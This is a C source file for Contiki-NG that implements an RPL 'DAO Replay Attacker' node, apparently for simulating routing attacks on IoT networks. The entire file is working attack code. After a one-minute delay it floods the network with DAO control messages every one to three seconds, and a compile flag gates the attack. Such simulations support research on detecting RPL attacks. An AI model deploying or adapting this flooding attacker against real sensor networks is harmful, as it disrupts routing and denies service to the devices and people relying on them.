/*
 * DAO Replay Attacker Node
 * Simulates repeated DAO message injection attacks.
 */

#include "contiki.h"
#include "net/routing/routing.h"
#include "net/routing/rpl-lite/rpl.h"
#include "sys/log.h"
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "random.h"     /* Contiki-NG random API */
#include "sys/clock.h"  /* if you use clock_time() to seed */

#define LOG_MODULE "Attacker"
#define LOG_LEVEL LOG_LEVEL_INFO

#include "project-conf.h"

#define ATTACK_START_DELAY 60  /* Wait 1 minute for RPL to stabilize */
#define MIN_ATTACK_INTERVAL 1  /* seconds */
#define MAX_ATTACK_INTERVAL 3

PROCESS(attacker_process, "DAO Replay Attacker");
AUTOSTART_PROCESSES(&attacker_process);

PROCESS_THREAD(attacker_process, ev, data)
{
  static struct etimer attack_timer;
  (void)attack_timer;

  PROCESS_BEGIN();

#if ENABLE_ATTACK
  static uint32_t attack_count = 0;
  uint16_t next_interval;

  LOG_WARN("⚔️ DAO Replay Attacker initialized. Attack begins in %d seconds...\n",
           ATTACK_START_DELAY);

  /* Wait for network formation */
  etimer_set(&attack_timer, ATTACK_START_DELAY * CLOCK_SECOND);
  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&attack_timer));

  LOG_WARN("=== 🚨 ATTACK STARTED ===\n");

  while(1) {
    if(NETSTACK_ROUTING.node_is_reachable()) {
      rpl_icmp6_dao_output(0);
      attack_count++;
      LOG_WARN("Sent fake DAO #%lu\n", (unsigned long)attack_count);
    }

    /* Randomize next attack interval */
    next_interval = MIN_ATTACK_INTERVAL +
                    (random_rand() % (MAX_ATTACK_INTERVAL - MIN_ATTACK_INTERVAL + 1));
    etimer_set(&attack_timer, next_interval * CLOCK_SECOND);
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&attack_timer));
  }

#else
  LOG_INFO("🟩 Attack mode disabled. Passive attacker node.\n");
  PROCESS_YIELD();
#endif

  PROCESS_END();
}
